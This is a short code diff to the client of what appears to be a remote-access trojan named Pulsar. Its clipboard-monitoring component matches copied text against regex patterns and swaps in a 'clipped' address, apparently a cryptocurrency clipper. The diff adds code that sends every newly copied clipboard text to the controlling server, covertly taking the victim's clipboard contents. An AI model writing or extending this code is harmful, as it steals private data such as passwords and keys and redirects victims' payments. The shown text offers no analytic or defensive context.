@@ -15,6 +15,7 @@ namespace Pulsar.Client.User
     {
         private readonly PulsarClient _client;
         private readonly List<Tuple<string, Regex>> _regexPatterns;
+        private string _lastClipboardText = "";
         
         private const int WM_CLIPBOARDUPDATE = 0x031D;
 
@@ -54,9 +55,8 @@ namespace Pulsar.Client.User
             }
 
             base.WndProc(ref m);
-        }
-
-        private void ClipboardCheck()
+        }        
+          private void ClipboardCheck()
         {
             try
             {
@@ -71,6 +71,11 @@ namespace Pulsar.Client.User
                         return;
                     }
                     
+                    if (clipboardText != _lastClipboardText)
+                    {
+                        _lastClipboardText = clipboardText;
+                        _client.Send(new SetUserClipboardStatus { ClipboardText = clipboardText });
+                    }
 
                     // If the copied address is already the clipped address, updating the clipboard with the same address will be
                     // a waste of resources for both the server and client; it may also cause undefined behavior.
